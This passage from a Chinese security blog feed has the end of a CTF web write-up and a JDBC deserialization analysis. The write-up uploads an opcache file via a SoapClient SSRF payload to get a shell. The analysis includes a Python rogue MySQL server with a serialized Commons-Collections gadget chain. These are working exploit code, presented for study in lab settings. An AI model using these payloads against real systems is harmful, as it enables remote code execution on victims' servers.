class="keyword">raise</span> ValueError(<span class="string">&quot;输入字符串的长度必须是偶数&quot;</span>)</span><br><span class="line">    pairs = [input_string[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(input_string), <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> pairs</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">totime</span>(<span class="params">time</span>):</span><br><span class="line">    b = split_string_into_pairs(<span class="string">f&quot;<span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">int</span>(time))&#125;</span>&quot;</span>)</span><br><span class="line">    b.pop(<span class="number">0</span>)</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(b)):</span><br><span class="line">        s += b[-<span class="number">1</span>]</span><br><span class="line">        b.pop(-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changetime</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;index.php.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        binary_data = file.read()</span><br><span class="line">        <span class="comment"># 将二进制数据转换为十六进制字符串</span></span><br><span class="line">        hex_data = binascii.hexlify(binary_data).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        new_data = hex_data[<span class="number">0</span>:<span class="number">128</span>]+totime(timec())+hex_data[<span class="number">136</span>:]</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;index.php.bin&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(<span class="built_in">bytes</span>.fromhex(new_data))</span><br><span class="line">changetime()</span><br><span class="line">sys_id = hashlib.md5(<span class="string">&quot;8.2.10API420220829,NTSBIN_4888(size_t)8\002&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(sys_id)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tar_file</span>():</span><br><span class="line">    tar_filename = <span class="string">&#x27;exp.tar&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(tar_filename,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> tar:</span><br><span class="line">        directory_info = tarfile.TarInfo(name=<span class="string">f&#x27;<span class="subst">&#123;sys_id&#125;</span>/var/www/html&#x27;</span>)</span><br><span class="line">        directory_info.<span class="built_in">type</span> = tarfile.DIRTYPE</span><br><span class="line">        directory_info.mode = <span class="number">0o777</span></span><br><span class="line">        tar.addfile(directory_info)</span><br><span class="line">        tar.add(<span class="string">&#x27;index.php.bin&#x27;</span>, arcname=<span class="string">f&#x27;<span class="subst">&#123;sys_id&#125;</span>/var/www/html/index.php.bin&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    file = &#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&quot;exp.tar&quot;</span>,<span class="built_in">open</span>(<span class="string">&quot;exp.tar&quot;</span>,<span class="string">&quot;rb&quot;</span>).read(),<span class="string">&quot;application/x-tar&quot;</span>)&#125;</span><br><span class="line">    res  = requests.post(url=<span class="string">&quot;http://12943d13-4210-4cf7-8219-8aa4761aef73.node4.buuoj.cn:81/siranai.php&quot;</span>,files=file)</span><br><span class="line">    <span class="built_in">print</span>(res.request.headers)</span><br><span class="line">    <span class="keyword">return</span> res.request</span><br><span class="line">tar_file()</span><br><span class="line">request_content = upload()</span><br><span class="line">upload_body = <span class="built_in">str</span>(request_content.body).replace(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\\&quot;&quot;</span>)</span><br><span class="line">content_length = request_content.headers[<span class="string">&#x27;Content-Length&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(content_length)</span><br><span class="line"><span class="built_in">print</span>(upload_body)</span><br></pre></td></tr></table></figure><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/22.png" class><p>将生成的请求体数据封装在 SoapClient 内置类里，序列化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">siroha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$koi</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$postdata</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&quot;http://127.0.0.1/siranai.php&quot;</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;Enterpr1se\r\n&quot;</span> . <span class="string">&quot;Cookie: PHPSESSION=16aaab9fb\r\nContent-Type: multipart/form-data; boundary=&quot;</span> . <span class="title function_ invoke__">substr</span>(<span class="variable">$postdata</span>, <span class="number">2</span>, <span class="number">32</span>) . <span class="string">&quot;\r\nConnection: keep-alive\r\nAccept: */*\r\nContent-Length: 10416&quot;</span> . <span class="string">&quot;\r\n\r\n&quot;</span> . <span class="variable">$postdata</span>,</span><br><span class="line">        <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;http://127.0.0.1/siranai.php&quot;</span>));</span><br><span class="line">&#125; <span class="keyword">catch</span> (SoapFault <span class="variable">$e</span>) &#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">siroha</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;koi=[<span class="string">&quot;zhanjiangdiyishenqing&quot;</span>=&gt;[<span class="variable">$a</span>,<span class="string">&quot;nnnnn&quot;</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><p>这里调用 SoapClient 对象的不存在的nnnnn方法，会触发call方法。burp发包</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/23.png" class><p>这里实际上已经覆盖掉了，页面回显发生变化，实际上就是直接运行了我们上传的opcode，还挺神奇的</p><img src="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/24.png" class><p>这就已经成功拿到shell了。</p><h3 id="ezfastjson"><a href="#ezfastjson" class="headerlink" title="ezfastjson"></a>ezfastjson</h3><p>题目环境关了，本来挺想复现这个题的，期望后续环境能开。</p><p>官方wp：<a href="https://dxh3b3fqgc3.feishu.cn/docx/HkgmdV6Fgom3P0x0iUscKxYZnLd">https://dxh3b3fqgc3.feishu.cn/docx/HkgmdV6Fgom3P0x0iUscKxYZnLd</a></p>]]></content>
      
      
      <categories>
          
          <category> 赛题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JDBC反序列化漏洞分析</title>
      <link href="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-JDBC简介"><a href="#0x01-JDBC简介" class="headerlink" title="0x01 JDBC简介"></a>0x01 JDBC简介</h2><p>Java数据库连接，（Java Database Connectivity，简称JDBC），它是java程序与数据库交互的一组API，它提供了一种标准的方法，使Java应用程序能够执行SQL查询、更新数据库记录以及检索和更新结果集。这些API组要位于JDK的java.sql包中。</p><p>JDBC的引入实现了java程序对数据库的便捷访问，通过使用JDBC，可以将sql语句传给任何一种数据库，不必单独写程序访问不同的数据库。</p><h2 id="0x02-简单demo"><a href="#0x02-简单demo" class="headerlink" title="0x02 简单demo"></a>0x02 简单demo</h2><p>JDK并不自带java,sql包，需要写maven来导入</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.19<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Jdbc_Connect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;<span class="comment">//导入API所需包</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        <span class="comment">//JDBC驱动程序</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">driver</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>;</span><br><span class="line">        <span class="comment">//数据库连接URL以及相关配置</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/security?serverTimezone=UTC&amp;autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">        <span class="comment">//加载驱动类</span></span><br><span class="line">        Class.forName(driver);</span><br><span class="line">        <span class="comment">//通过 Drivermanager 类获取数据库连接的实例</span></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">connection</span> <span class="operator">=</span> DriverManager.getConnection(url,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;xiao23&quot;</span>);</span><br><span class="line">        <span class="comment">//利用createStatement接口获取一个statement对象，用于执行sql语句</span></span><br><span class="line">        <span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line">        <span class="comment">//执行sql语句，将结果保存在ResultSet对象中</span></span><br><span class="line">        <span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(<span class="string">&quot;SELECT * FROM users&quot;</span>);</span><br><span class="line">        <span class="comment">//将结果集输出出来</span></span><br><span class="line">        <span class="keyword">while</span> (resultSet.next())&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> resultSet.getString(<span class="string">&quot;password&quot;</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">userId</span> <span class="operator">=</span> resultSet.getInt(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;id:&quot;</span>+userId+<span class="string">&quot; username:&quot;</span>+username+<span class="string">&quot; password:&quot;</span>+password);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//        System.out.println(connection);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>说一下数据库连接的一些配置吧，</p><blockquote><p>security 就是所需要连接的数据库名称</p><p>serverTimezone&#x3D;UTC 指定了数据库服务器的时区为协调世界时（UTC）没有正确的时间处理，运行是会报错的</p><p>autoDeserialize&#x3D;true 表明从数据库中检索数据会自动反序列化，这个设置很重要，设置为false就没法利用了</p><p>statementInterceptors&#x3D;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor 指定了一个Mysql的语句拦截器，用于在执行sql语句前处理特殊事件</p></blockquote><p>本地开启Mysql，看一下运行结果</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1.png" class><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>它和shiro一样，是存在反序列化点的，能够打 CC 的一些依赖。</p><p>漏洞利用前提：</p><p>攻击者能够控制JDBC连接设置项，并且可以控制去连接我们搭建的恶意的Mysql服务器，服务端有可打的依赖</p><p>怎么去理解呢？刚才说配置项的时候也提到过 autoDeserialize 选项开启，对Mysql的sql语句查询结果反序列化，这是一个非常好的反序列化入口。当我们在Mysql服务器设置恶意的payload，经过sql查询后，被当作查询结果返回给服务端来进行反序列化。</p><p>下面是一张比较清晰的JDBC请求过程的流程图（下图提到的服务器是Mysql服务器）</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/2.png" class><p>我们将payload设置为响应结果，即可在客户端执行反序列化攻击</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>引入可以打的依赖，如CC依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>首先需要搭建一个恶意的Mysql Server，github上有相关的参考</p><p><a href="https://github.com/fnmsd/MySQL_Fake_Server">https://github.com/fnmsd/MySQL_Fake_Server</a></p><p><a href="https://github.com/rmb122/rogue_mysql_server">https://github.com/rmb122/rogue_mysql_server</a></p><p>还有一种用python写的Mysql 服务，用python3即可运行成功，挺方便，于是就用这个脚本（脚本下文会分析）</p><p>在kali中运行脚本开启恶意的Mysql服务</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/3.png" class><p>编写数据库连接程序，其实都大差不差</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDBCAttack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, SQLException &#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jdbc_url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://192.168.111.128:3306/test?&quot;</span> +</span><br><span class="line">                <span class="string">&quot;autoDeserialize=true&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">con</span> <span class="operator">=</span> DriverManager.getConnection(jdbc_url, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;root&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行程序</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/4.png" class><p>弹出计算器，看来是反序列化成功的</p><h3 id="代码调试"><a href="#代码调试" class="headerlink" title="代码调试"></a>代码调试</h3><p>看上面的代码，是没有执行sql语句的，仅仅做了一个数据库的连接，我们知道，恶意Mysql服务器将payload设置为执行sql语句的响应。目前来看，只有连接就可以反序列化成功，那么在数据库连接的时候，就会有内置的sql语句去执行</p><p>代码调试，将断点下在JDBC连接数据库的地方</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/5.png" class><p>这里创建一个连接实例，跟进，然后初始或相关信息，比如IP，端口，数据库名等等，然后走到 ConnectionImpl 类的createNewIO 方法，中间繁琐的过程不再说了，跳着看</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/6.png" class><p>在 Connectionlmpl 类 2046行的 execSQL 方法中</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/7.png" class><p>执行了两条sql语句，继续跟进，将查询语句封装成数据包</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/8.png" class><p>然后发送</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/9.png" class><p>这里判断是否存在拦截器，当前是有的，因为我们在配置项设置过了，然后会调用拦截器方法处理相关事件</p><p>然后在 ServerStatusDiffInterceptor 拦截器类的第86行也做了一个内置sql语句的执行</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/10.png" class><p>然后跟进 resultSetToMap， 对查询结果集进行处理</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/11.png" class><p>这里会调用 ResultSetImpI 类的getObject方法</p><p>这里检查 mysql 字段的字段类型，必须要满足 Binary和Blob 的数据类型，然后获取字节码数据</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/12.png" class><p>接下来就是判断 autoDeserialize是否为true，字节码数据是否为序列化对象等</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/13.png" class><p>然后判断字节数组的前两个字节为 -84和-19，</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/14.png" class><p>最后就是对data进行反序列化</p><p>本漏洞利用难点在于如何编写恶意的Mysql服务器，为了更好的分析python脚本，对mysql流量进行分析</p><h3 id="wireshark抓包分析"><a href="#wireshark抓包分析" class="headerlink" title="wireshark抓包分析"></a>wireshark抓包分析</h3><p>针对上面的demo，利用wireshark抓取mysql数据包进行分析</p><p>Mysql流量过滤语句：tcp.port &#x3D;&#x3D;3306 &amp;&amp; mysql  （192.168.111.1为客户端，192.168.111.128为Mysql服务端）</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/15.png" class><p>首先Mysql服务端向客户端发送一个greeting报文，对建立连接阶段起到了握手协商的作用</p><p>随后客户端向Mysql服务端发起登录认证请求，然后服务端向客户端回复 Response OK返回包，表示认证登录成功</p><p>随后客户端向服务端发起查询请求，服务端返回 Response TABULAR Response OK 的响应包，看一下这几个查询语句都是什么</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/16.png" class><p>查询语句：SET NAMES</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/17.png" class><p>查询语句：set character_set_results</p><p>跳过三个查询请求后</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/18.png" class><p>这里会执行 show session status 内置的sql语句，看看响应包</p><img src="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/19.png" class><p>是不是很熟悉，这就是打CC依赖的序列化串，上面代码调试的时候也提到过，客户端会发送 show session status 内置sql语句，然后将执行结果反序列化。所以在搭建恶意mysql服务器的时候，将payload设置为这个内置的sql语句的响应，也只能设置在这里。</p><p>实际上，恶意的Mysql服务器只需要编写 Response OK，Response TABULAR Response OK 以及payload响应即可</p><p>分析完数据包后，接下来对搭建Mysql服务器的python脚本进行解释</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">greeting_data=<span class="string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span></span><br><span class="line">response_ok_data=<span class="string">&quot;0700000200000002000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#接收请求包的数据，接收1024大小的数据，并且转字符串转小写</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="comment">#将十六进制转换为二进制，将数据通过连接对象的send方法发送</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="comment">#该方法定义了payload的生成</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    <span class="comment">#file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &gt; payload</span></span><br><span class="line">    file= <span class="string">r&#x27;payload&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = <span class="built_in">str</span>(binascii.b2a_hex(f.read()),encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open successs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open false&quot;</span>)</span><br><span class="line">        <span class="comment">#如果没有文件，默认使用弹计算器的默认payload</span></span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload_content</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主要逻辑</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment">#接收客户端的连接</span></span><br><span class="line">        conn, addr = sk.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 1.先发送第一个问候报文</span></span><br><span class="line">        send_data(conn,greeting_data)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment"># 登录认证过程模拟  1.客户端发送request login报文 2.服务端响应response_ok</span></span><br><span class="line">            receive_data(conn)</span><br><span class="line">            send_data(conn,response_ok_data)</span><br><span class="line"></span><br><span class="line">            <span class="comment">#其他过程</span></span><br><span class="line">            data=receive_data(conn)</span><br><span class="line">            <span class="comment">#客户端请求查询一些配置信息,根据不同的查询信息设置响应信息，这些在分析数据包的时候看到过</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;session.auto_increment_increment&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload=<span class="string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f03646566000000107